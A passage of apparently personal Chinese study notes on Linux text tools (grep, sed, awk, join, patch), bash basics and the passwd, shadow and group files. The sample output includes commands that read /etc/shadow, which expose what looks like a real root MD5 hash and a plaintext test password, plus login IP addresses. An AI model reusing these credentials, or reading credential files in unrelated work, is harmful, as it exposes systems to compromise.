2&gt;&amp;1<br>[root@YH YH]# cat error<br>find: unknown predicate &#96;-nam’</p></blockquote><h3 id="多命令运行"><a href="#多命令运行" class="headerlink" title="多命令运行"></a>多命令运行</h3><ul><li><p>; :使用这个符号可以让命令按照循序执行</p><ul><li><blockquote><p>例如在关机前进行同步</p><p>sync;shutdown</p></blockquote></li></ul></li><li><p>&amp;&amp; :前面的命令执行成功后才会执行后面的命令</p><ul><li><blockquote><p>ls &#x2F;home&#x2F;aaa &amp;&amp; mkdir &#x2F;home&#x2F;aaa&#x2F;bbb</p><p>如果存在 &#x2F;home&#x2F;aaa则建立文件夹否则不建立</p></blockquote></li></ul></li><li><p>|| :如果前面的命令执行成功则不执行后面的</p><ul><li><blockquote><p>ls &#x2F;home&#x2F;aaa || mkdir &#x2F;home&#x2F;aaa</p><p>如果目录不存在则新建一个目录</p></blockquote></li></ul></li></ul><p>注意这里||的优先级和&amp;&amp;一样</p><p>或者使用test命令来实现上面的功能</p><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>用来处理标准输出流的信息例如:</p><blockquote><p>[root@YH YH]# ls | more<br>1.txt<br>1.txt.gz<br>cat<br>error<br>etc.tar.bz2<br>etc.tar.gz<br>etc.tar.xz<br>h<br>Java语言程序设计.进阶篇.原书第10版.pdf<br>services.[gz<br>test.img<br>vitest</p></blockquote><p>&#x3D;&#x3D;管道命令必须能够接受来自前一个命令的数据成为标准输入继续处理才行&#x3D;&#x3D;</p><p>例如2&gt;&amp;1可以使用管道来修改达到同样的操作</p><h4 id="与管道配合使用的命令"><a href="#与管道配合使用的命令" class="headerlink" title="与管道配合使用的命令"></a>与管道配合使用的命令</h4><ul><li><p>cut:将输入流中的数据进行分割</p><ul><li><p>-d ‘分隔符’:按照字符进行分割常常与-f使用</p></li><li><p>-f :取出分割的第n个片段</p></li><li><blockquote><p>[root@YH YH]# echo $PATH | cut -d ‘:’ -f 1,3</p><p>取出第一个和第三个</p><p>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;sbin<br>[root@YH YH]# echo $PATH<br>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin</p></blockquote></li><li><p>-c取出固定字符区间的所有字符</p></li><li><blockquote><p>[root@YH YH]# export<br>declare -x HISTSIZE&#x3D;”3000”<br>declare -x HISTTIMEFORMAT&#x3D;”%F %T “<br>declare -x HOME&#x3D;”&#x2F;root”<br>declare -x HOSTNAME&#x3D;”YH”<br>declare -x LANG&#x3D;”en_US.utf8”<br>declare -x LESSOPEN&#x3D;”||&#x2F;usr&#x2F;bin&#x2F;lesspipe.sh %s”<br>declare -x LOGNAME&#x3D;”root”</p><p>使用前</p><p>[root@YH YH]# export | cut -c 12-<br>HISTSIZE&#x3D;”3000”<br>HISTTIMEFORMAT&#x3D;”%F %T “<br>HOME&#x3D;”&#x2F;root”<br>HOSTNAME&#x3D;”YH”<br>LANG&#x3D;”en_US.utf8”<br>LESSOPEN&#x3D;”||&#x2F;usr&#x2F;bin&#x2F;lesspipe.sh %s”<br>LOGNAME&#x3D;”root”</p><p>使用后</p></blockquote></li></ul></li><li><p>grep分析并找出需要的数据</p><ul><li><p>-A :找出匹配的行之后的n行</p></li><li><p>-B :找出匹配的行之间的n行</p></li><li><p>-v :将不包含的行列出来</p></li><li><p>-n :显示行号</p></li><li><p>-i :忽略大小写</p></li><li><blockquote><p>[root@YH ~]# dmesg | grep -n –color&#x3D;auto ‘0x80000000-0xfeffbfff’<br>100:[    0.000000] e820: [mem 0x80000000-0xfeffbfff] available for PCI devices<br>[root@YH ~]# dmesg | grep -n -A3 -B2 –color&#x3D;auto ‘0x80000000-0xfeffbfff’<br>98-[    0.000000] PM: Registered nosave memory: [mem 0x000a0000-0x000effff]<br>99-[    0.000000] PM: Registered nosave memory: [mem 0x000f0000-0x000fffff]<br>100:[    0.000000] e820: [mem 0x80000000-0xfeffbfff] available for PCI devices<br>101-[    0.000000] Booting paravirtualized kernel on KVM<br>102-[    0.000000] setup_percpu: NR_CPUS:5120 nr_cpumask_bits:1 nr_cpu_ids:1 nr_node_ids:1<br>103-[    0.000000] percpu: Embedded 38 pages&#x2F;cpu s118784 r8192 d28672 u2097152</p></blockquote></li><li><p>还可以使用正则表达式进行查找,不过命令太多了</p></li><li><blockquote><p>[root@YH YH]# ls | grep ‘.’<br>1.txt<br>1.txt.gz<br>cat<br>error<br>etc.tar.bz2<br>etc.tar.gz<br>etc.tar.xz<br>h<br>Java语言程序设计.进阶篇.原书第10版.pdf<br>services.[gz<br>test.img<br>vitest<br>[root@YH YH]# ls | grep ‘h’<br>h</p></blockquote></li></ul></li><li><p>sort:排序</p><ul><li>-f:忽略大小写</li><li>-b:忽略最前面空格</li><li>-M:月份名称排序</li><li>-n:使用纯数字进行排序</li><li>-r:反向排序</li><li>-u:uniq相同的数据中,仅出线一行代表</li><li>-t:分隔符号,使用Tab来分割</li><li>-k:以哪个区间进行排序</li></ul></li><li><p>uniq:去重</p><ul><li>-i:忽略大小写</li><li>-c:进行计数</li></ul></li><li><p>wc:统计字符</p><ul><li>-l 多少行</li><li>-w 多少字母</li><li>-m 多少字符</li></ul></li><li><p>tee:可以将输出的数据流一份给文件一份</p></li><li><p>tr [-ds] set1 set2:进行替换或者删除字符</p><ul><li><p>-d 删除set1字符</p></li><li><p>-s 替换掉重复的字符</p></li><li><blockquote><p>last | tr ‘[a-z]’ ‘[A-Z]’</p></blockquote></li></ul></li><li><p>join:两个文件中传递数据</p><ul><li><p>-t:设置分隔符默认时空格</p></li><li><p>-i:忽略大小写</p></li><li><blockquote><p>join -t ‘:’ &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow<br>root:x :0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash:$1$ZsTljEDo$JK&#x2F;OTgZctSUcDODqjDrg.0:18880:0:99999:7:::<br>bin:x :1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin:<em>:17834:0:99999:7:::<br>daemon:x : 2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin:</em>:17834:0:99999:7:::<br>adm:x :3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin:*:17834:0:99999:7:::</p></blockquote></li><li><p>建议在连接两个文件之前先排序</p></li></ul></li><li><p>paste:和join差不多</p></li><li><p>expand:将tab转换为空格</p></li><li><p>split:将大文件进行划分</p><ul><li>-l 按行划分</li><li>-b 按大小划分</li></ul></li><li><p>xargs:<a href="https://www.runoob.com/linux/linux-comm-xargs.html">https://www.runoob.com/linux/linux-comm-xargs.html</a></p><ul><li>emmmmmm,呃呃呃呃呃呃呃呃呃呃呃呃呃呃,啊啊啊啊啊啊啊啊啊啊啊</li></ul></li><li><p>关于-:</p><ul><li>当我们使用了一个必须添加文件名的命令可以使用-来进行代替</li></ul></li></ul><h2 id="正则与格式化处理文件"><a href="#正则与格式化处理文件" class="headerlink" title="正则与格式化处理文件"></a>正则与格式化处理文件</h2><p>正则分为:基础正则表达式与扩展表达式</p><p>查找方式是or而不是and</p><p>对字符串排序影响语系意义的则会对正则结果有影响</p><blockquote><p>举个例子</p><p>LANG＝C的英文编码顺序为01234….ABCD…abcd</p><p>但是下面的编码顺序为</p><p>LANG&#x3D;zh_CH时编码顺序为:01234…aAbBcCdDeE</p><p>如果使用[A-B]第一个语系会正确的选取到AB两个字母但是下面则会额外的选取到b这个字符</p></blockquote><p>这里演示一般使用grep命令</p><p>由于语系有问题所以可能会用到一些符号</p><table><thead><tr><th>特殊符号</th><th>代表意义</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>所有英文字母以及数字</td></tr><tr><td>[:alpha:]</td><td>任何大小写字母</td></tr><tr><td>[:blank:]</td><td>空格或tab</td></tr><tr><td>[:cntrl:]</td><td>控制按键</td></tr><tr><td>[:digit:]</td><td>数字</td></tr><tr><td>[:graph:]</td><td>除了空格与tab所有按键</td></tr><tr><td>[:lower:]</td><td>小写字母</td></tr><tr><td>[:print:]</td><td>可以被打印出来的字母</td></tr><tr><td>[:punct:]</td><td>标点符号</td></tr><tr><td>[:upper:]</td><td>大写字母</td></tr><tr><td>[:space:]</td><td>会产生空格的字符</td></tr><tr><td>[:xdigit:]</td><td>十六进制的数字类型、因此包含0<del>9、A</del>F、a~f等</td></tr></tbody></table><ul><li><p>[] :括号内的字符任意一个都可以进行匹配</p></li><li><p>- :代表连续的字符</p><ul><li><p>例如查找a到z包含的字符串</p></li><li><blockquote><p>grep -n ‘[a-z]’ re.txt</p></blockquote></li></ul></li><li><p>^ :如果被包含在中括号内则代表不包含的意思否则代表以后面那个字符开头的意思</p><ul><li><blockquote><p>[root@YH YH]# grep -n ‘^[^a-zA-Z]’ regular_express.txt<br>1:”Open Source” is a good mechanism to develop programs.<br>21:# I am VBird</p></blockquote><p>代表不以英文字母开头</p></li></ul></li><li><p>$ :代表以前面那个字符结尾</p><ul><li><p>如果想要找出空行可以使用</p></li><li><blockquote><p>^&amp;例如</p><p>[root@YH YH]# grep -n ‘^$’ regular_express.txt<br>22:</p></blockquote></li></ul></li><li><p>. :匹配任意一个字符</p></li><li><p>* :重复前一个字符0~无穷次</p></li><li><p>+ :重复前一个字符1~无穷次,必须使用-e 或egrep</p></li><li><p>? :重复前一个字符0~1次,必须使用-e 或egrep</p></li><li><p>| :或者 ,必须使用-e 或egrep</p></li><li><p>():群组没太看懂,必须使用-e 或egrep</p></li><li><p>()+:多重复群组判别,必须使用-e 或egrep</p></li><li><p>{}:包含前一个字符的特定个数例如(注意因为{}都是bash的特殊字符所以要转义)</p><ul><li><blockquote><p>‘o\{2\}’</p><p>找出连续的两个o</p><p>[root@YH YH]# grep -n ‘o{2}‘ regular_express.txt<br>1:”Open Source” is a good mechanism to develop programs.<br>2:apple is my favorite food.<br>3:Football game is not use feet only.<br>9:Oh! The soup taste good.<br>18:google is the best tools for search keyword.<br>19:goooooogle yes!<br>[root@YH YH]# grep -n ‘o{4}‘ regular_express.txt<br>19:goooooogle yes!</p></blockquote></li></ul></li></ul><p>找出所有不是空行且非注释的内容</p><blockquote><p>grep ‘^[^#]’ &#x2F;etc&#x2F;rsyslog.conf –color&#x3D;auto &gt; &#x2F;usr&#x2F;local&#x2F;YH&#x2F;2.txt </p><p>grep -v ‘^$’ &#x2F;etc&#x2F;rsyslog.conf | grep -v ‘^#’ –color&#x3D;auto  &gt; &#x2F;usr&#x2F;local&#x2F;YH&#x2F;1.txt</p><p>上面两个语句结果一致(第一个我写的第二个书上写的)</p><p>可以使用多窗口来同时比对结果</p></blockquote><ul><li><p>printf:格式化输出</p><ul><li><blockquote><p><a href="https://www.linuxprobe.com/linux-printf-example.html">https://www.linuxprobe.com/linux-printf-example.html</a></p></blockquote><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@localhost</span> <span class="hljs-operator">~</span>]# printf <span class="hljs-string">&quot;姓名：%s<span class="hljs-subst">\n</span>身高：%dcm<span class="hljs-subst">\n</span>体重：%dkg<span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-string">&quot;小明&quot;</span> <span class="hljs-string">&quot;180&quot;</span> <span class="hljs-string">&quot;75&quot;</span><br>姓名：小明<br>身高：180cm<br>体重：75kg<br></code></pre></td></tr></table></figure></li></ul></li><li><p>sed: sed [-nerf] [操作]</p><ul><li><p>-n :使用安静模式,只有讲过特殊处理的行或操作才列出来</p></li><li><p>-e :直接在命令行上进行sed操作编辑</p></li><li><p>-f :直接将sed操作写在一个文件内 -f filename </p></li><li><p>-r :sed的操作使用的是扩展型正则</p></li><li><p>-i :直接修改读取的文件内容</p></li><li><p>操作说明:[n1[,n2]] function $代表最后一行</p><ul><li><p>a 新增</p></li><li><blockquote><p>[root@YH YH]# nl &#x2F;etc&#x2F;passwd | sed  ‘3a sadfasdfas\<br>&gt; asdasfasd’<br>1root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>2bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>3daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>sadfasdfas<br>asdasfasd</p></blockquote></li><li><p>c 替换</p></li><li><blockquote><p>nl &#x2F;etc&#x2F;passwd | sed  ‘2,20c aaaaa’<br>1root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>aaaaa<br>21sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin<br>22postfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologin</p></blockquote></li><li><p>d 删除</p></li><li><p>i 插入</p></li><li><blockquote><p>[root@YH YH]# nl &#x2F;etc&#x2F;passwd | sed  ‘3i sadfasdfas<br>&gt; adfasdfasdf’<br>1root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>2bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>sadfasdfas<br>adfasdfasdf</p></blockquote></li><li><p>p 打印</p></li><li><blockquote><p>显示2-5行</p><p>[root@YH YH]# nl &#x2F;etc&#x2F;passwd | sed -n ‘2,5p’<br>2bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>3daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>4adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>5lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</p></blockquote></li><li><p>s 替换</p></li><li><blockquote><p>‘s&#x2F;要替换的字符&#x2F;新的字符&#x2F;g’</p><p>[root@YH ~]# last<br>root     pts&#x2F;3        153.118.34.219   Wed Sep 15 11:39   still logged in<br>root     pts&#x2F;2        153.118.34.219   Wed Sep 15 10:51   still logged in<br>root     pts&#x2F;0        153.118.34.219   Wed Sep 15 10:47   still logged in<br>root     pts&#x2F;2        153.118.34.219   Wed Sep 15 10:47 - 10:47  (00:00)<br>root     pts&#x2F;0        153.118.34.219   Wed Sep 15 10:19 - 10:47  (00:27)    </p><p>替换前</p></blockquote><blockquote><p>[root@YH ~]# last | sed ‘s&#x2F;  <em>.</em>$&#x2F;&#x2F;g’<br>root<br>root<br>root<br>root<br>root<br>root</p><p>替换后</p></blockquote></li><li><p>使用\来换行</p></li><li><blockquote><p>[root@YH YH]# nl &#x2F;etc&#x2F;passwd | sed ‘3,$d’<br>1root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>2bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</p></blockquote></li></ul><p>&#x3D;&#x3D;可以之间使用sed来修改文件,但是正则容易出现逻辑错误不建议直接修改文件&#x3D;&#x3D;</p></li></ul></li><li><p>awk:数据处理工具</p><ul><li><p>适合小型的文本数据</p></li><li><blockquote><p>[root@YH ~]# last -n 5<br>root     pts&#x2F;1        153.118.80.111   Wed Sep 15 12:20   still logged in<br>root     pts&#x2F;3        153.118.34.219   Wed Sep 15 11:39   still logged in<br>root     pts&#x2F;2        153.118.34.219   Wed Sep 15 10:51   still logged in<br>root     pts&#x2F;0        153.118.34.219   Wed Sep 15 10:47   still logged in<br>root     pts&#x2F;2        153.118.34.219   Wed Sep 15 10:47 - 10:47  (00:00)    </p><p>wtmp begins Fri Sep 10 09:47:22 2021<br>[root@YH ~]# last -n 5 | awk ‘{print $1 “\t” $3}’<br>root153.118.80.111<br>root153.118.34.219<br>root153.118.34.219<br>root153.118.34.219<br>root153.118.34.219</p><p>这在里面可以使用 变量$1 这种</p><p>也可以使用全局变量</p><p>NR目前awk所处理的是第行数据</p><p>FS 目前的分割字符</p><p>NF 每一行拥有的字段总数</p><p>[root@YH ~]# last -n 5 | awk ‘{print $1 “\t lines:” NR “\t columns:” NF “\t” $3}’<br>root lines:1 columns:10153.118.80.111<br>root lines:2 columns:10153.118.34.219<br>root lines:3 columns:10153.118.34.219<br>root lines:4 columns:10153.118.34.219<br>root lines:5 columns:10153.118.34.219<br> lines:6 columns:0<br>wtmp lines:7 columns:7Fri</p></blockquote><p>还有很多用法</p><blockquote><p><a href="https://www.linuxprobe.com/linux-awk-clever.html">https://www.linuxprobe.com/linux-awk-clever.html</a></p></blockquote></li></ul></li><li><p>diff:查看两个问价你的差异</p><ul><li><blockquote><p>[root@YH YH]# diff 1.txt 2.txt<br>[root@YH YH]# vim 2.txt<br>[root@YH YH]# diff 1.txt 2.txt<br>14a15</p><p>&gt; i</p><p>通过vim在最后一行新加一个文件14a15应该是在14行后面新加了15行增加内容为i</p></blockquote></li></ul></li><li><p>cmp:字节比对</p></li><li><p>patch:这个和diff结合有点像git了</p><ul><li><p>首先使用diff来创建补丁文件</p></li><li><blockquote><p>[root@YH YH]# diff passwd.old passwd.new&gt;passwd.patch<br>[root@YH YH]# diff -Naur passwd.old passwd.new&gt;passwd.patch<br>[root@YH YH]# cat passwd.patch<br>— passwd.old2021-09-15 14:09:27.393427041 +0800<br>+++ passwd.new2021-09-15 14:08:20.921977408 +0800<br>@@ -1,9 +1,8 @@<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>-daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>-sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync<br>+asdfasdf<br>shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown<br>halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt<br>mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</p></blockquote></li><li><p>使用补丁文件进行更新</p><blockquote><p>[root@YH YH]# patch -p0 &lt; passwd.patch<br>patching file passwd.old<br>[root@YH YH]# cat passwd.old<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>asdfasdf</p></blockquote></li><li><p>使用补丁文件进行复原</p><blockquote><p>[root@YH YH]# patch -R -p0 &lt; passwd.patch<br>patching file passwd.old</p><p>[root@YH YH]# head -n 5 passwd.old<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</p></blockquote></li></ul></li></ul><h3 id="区别是否可用正则"><a href="#区别是否可用正则" class="headerlink" title="区别是否可用正则"></a>区别是否可用正则</h3><p>或许使用’’的使用可以使用正则例如grep</p><p>不适用’’不能用正则 ls(在bash下*代表任意多个字符 例如ls v*)</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>编写第一个bash脚本</p><blockquote><p>[root@YH YH]# vim hello.sh<br>[root@YH YH]# cat hello.sh<br>#!&#x2F;bin&#x2F;bash<br>echo “Hello World !”<br>exit 0</p></blockquote><p>第一行是用来声明这是一个shell脚本但是#为注释,exit 0是代表程序的返回值</p><blockquote><p>[root@YH YH]# sh hello.sh<br>Hello World !</p></blockquote><p>执行脚本</p><blockquote><p>[root@YH YH]# vim hello.sh<br>[root@YH YH]# cat hello.sh<br>#!&#x2F;bin&#x2F;bash<br>echo “Hello World !”<br>read -p “请输入名字” firstname<br>echo -e “\nYour Name ${firstname}”<br>exit 0<br>[root@YH YH]# sh hello.sh<br>Hello World !<br>请输入名字YH</p><p>Your Name YH</p></blockquote><p>简单的交互式</p><p>关于计算</p><p>可以使用declare来建立数据类型的变量</p><p>$((计算式))在shell中使用这种来进行运算或使用bc来进行运算</p><blockquote><p>[root@YH ~]# echo “1*2”|bc<br>2<br>[root@YH ~]# echo “2*2”|bc<br>4</p></blockquote><h3 id="脚本的执行方式"><a href="#脚本的执行方式" class="headerlink" title="脚本的执行方式"></a>脚本的执行方式</h3><ul><li>直接执行系统会给脚本再创建一个进程来执行也就是创建一个子进程所以在子进程创建的变量都会在程序结束后无效</li><li>使用source来执行脚本</li></ul><p>test 用来检测文件,太多了…都是关于参数</p><p>利用[]进行判断(判断符号)</p><p>[ -z “${HOME}” ]中括号中间的两端必须有空格</p><ul><li>在中括号[]内的每个组件都需要有空格来分隔;</li><li>中括号内的变量要用双引号引起来</li><li>中括号内的常数也要用双引号或单引号引起来</li></ul><p>使用sh来调试</p><ul><li>sh [-nvx] *.sh<ul><li>-n :检查语法</li><li>-v :执行之前,先将脚本内容输出到屏幕上</li><li>-x :将脚本内容输出到屏幕上</li></ul></li></ul><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="用户标识UID与GID"><a href="#用户标识UID与GID" class="headerlink" title="用户标识UID与GID"></a>用户标识UID与GID</h3><p>每个登录用户至少有两个ID一个是用户ID一个是UID</p><p>Linux识别用户和组大部分都是靠ID识别</p><p>用来记录UID与GID的&#x2F;etc&#x2F;passwd与&#x2F;etc&#x2F;shadow文件</p><p>首先解析&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># nl /etc/passwd | sed &#x27;5,$d&#x27;</span><br>1root:x:0:0:root:/root:/bin/bash<br>2bin:x:1:1:bin:/bin:/sbin/nologin<br>3daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>4adm:x:3:4:adm:/var/adm:/sbin/nologin<br></code></pre></td></tr></table></figure><p>每一行都是以:分割</p><p>第一栏:账户名</p><p>第二栏:密码,由于放在这里不安全所以用x代替</p><p>第三栏:UID</p><table><thead><tr><th>ID范围</th><th>该ID用户特性</th></tr></thead><tbody><tr><td>0</td><td>系统管理员</td></tr><tr><td>1~999</td><td>除了0以外其他ID都一样只不过这个范围一般作为保留账号<br>1<del>200有Linux发行版本自己建立的系统账号<br>201</del>999:若用户有系统账号需求时可以使用UID</td></tr><tr><td>1000~60000</td><td>一般用户</td></tr></tbody></table><p>第四栏:GID</p><p>第五栏:用来解释该账号用来干嘛的</p><p>第六栏:家目录</p><p>第七栏:登录后使用的shell </p><p>讲解&#x2F;etc&#x2F;shadow文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># nl /etc/shadow</span><br>     1root:$1$ZsTljEDo<span class="hljs-variable">$JK</span>/OTgZctSUcDODqjDrg.0:18880:0:99999:7:::<br>     2bin:*:17834:0:99999:7:::<br>     3daemon:*:17834:0:99999:7:::<br></code></pre></td></tr></table></figure><ol><li>账号名</li><li>密码</li><li>最近修改密码的日期</li><li>密码不可被修改的天数(与第三字段相比)防止一改再改</li><li>密码需要重新修改的天数(与第三字段相比)</li><li>密码需要修改期限前的警告天数(与第五字段相比):密码再过n天就过期了</li><li>密码过期后的账户宽限时间(与第五字段相比):可以使用账户权限可以登录但是过了这个时间就无法登录</li><li>账号失效日期和第三个字段一样都是从1970年依赖的总天数</li><li>保留</li></ol><p>查看shadow的加密机制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># authconfig --test | grep hashing</span><br> password hashing algorithm is md5<br></code></pre></td></tr></table></figure><p>解析&#x2F;etc&#x2F;group</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># head /etc/group</span><br>root:x:0:<br>bin:x:1:<br>daemon:x:2:<br>sys:x:3:<br>adm:x:4:<br><span class="hljs-built_in">tty</span>:x:5:<br>disk:x:6:<br>lp:x:7:<br>mem:x:8:<br>kmem:x:9:<br></code></pre></td></tr></table></figure><ol><li><p>组名</p></li><li><p>用户组密码</p></li><li><p>GID</p></li><li><p>此用户组支持的账户</p><ul><li><p>由于该字段的特性所以可以设置一用户多组,下面介绍有效用户组</p></li><li><blockquote><p>在&#x2F;etc&#x2F;passwd里GID指代的时初始用户组而初始用户组并不会将该用户写入第四字段</p><p>而一登陆就立即获取初始用户组</p><p>如果要创建文件那么使用的是有效用户组</p><p>使用groups查看支持的所有用户组,但是第一个支持的组就是有效用户组</p><p>通常有效用户组的作用就是新建用户</p></blockquote></li><li><p>newgrp可以切换有效用户组但是使用了这个命令就进入了另一个shell环境</p></li></ul></li></ol><p>关于&#x2F;etc&#x2F;gshadow解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH Java]<span class="hljs-comment"># cat /etc/gshadow</span><br>root:::<br>bin:::<br>daemon:::<br>sys:::<br>adm:::<br><span class="hljs-built_in">tty</span>:::<br>disk:::<br>lp:::<br>mem:::<br>kmem:::<br>wheel:::<br>cdrom:::<br>mail:::postfix<br></code></pre></td></tr></table></figure><ol><li>组名</li><li>密码:开头为!标识无合法密码,所以无用户组管理员</li><li>用户组管理员账号</li><li>加入该组的用户</li></ol><h3 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h3><ul><li><p>useradd:添加一个用户(创建时至少参考&#x2F;etc&#x2F;default&#x2F;useradd,&#x2F;etc&#x2F;login.defs,&#x2F;etc&#x2F;skel&#x2F;*这三个文件)</p><ul><li><p>-u :输入一个uid</p></li><li><p>-g :初始用户组</p></li><li><p>-G :次要用户组</p></li><li><p>-M :强制不要建立家(系统账号默认)</p></li><li><p>-m :强制建立用户家(一般用户默认,默认权限700)</p></li><li><p>-c :介绍说明</p></li><li><p>-r :系统账户</p></li><li><p>-s :失效日期</p></li><li><p>-e :密码是否会失效</p></li><li><p>-D :查看默认的创建参数</p><ul><li><p>&#96;&#96;&#96;bash<br>[root@YH etc]# useradd -D<br>GROUP&#x3D;100   用户初始组id<br>HOME&#x3D;&#x2F;home  家的基准目录<br>INACTIVE&#x3D;-1 密码是否会失效<br>EXPIRE&#x3D;     账户失效日期<br>SHELL&#x3D;&#x2F;bin&#x2F;bash 默认的shell<br>SKEL&#x3D;&#x2F;etc&#x2F;skel  用户家目录参考基准目录(从这个目录的文件复制到家里面)<br>CREATE_MAIL_SPOOL&#x3D;yes</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>      <br><br>如果添加用户但是没有使用passwd进行更改shadow中不会对密码进行加密(账户也会被锁定无法登录)<br><br>```bash<br>[root@YH etc]# cat shadow | grep test<br><span class="hljs-title">testuser:123456:18886:0:99999:7:::</span><br><br></code></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p>centos有两种机制</p><blockquote><p>私有用户组机制</p><p>会创建一个与用户名一样的组因为用户有自己的组和家所以不会考虑GROUP&#x3D;100这个参数</p><p>公共用户机制</p><p>以GROUP&#x3D;100为值新建一个账号默认家目录的权限为drwxr-xr-x每个账户都属于用户组</p></blockquote><p>关于UID&#x2F;GID的密码参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH etc]<span class="hljs-comment"># cat login.defs | grep -v &#x27;^$&#x27; | grep -v 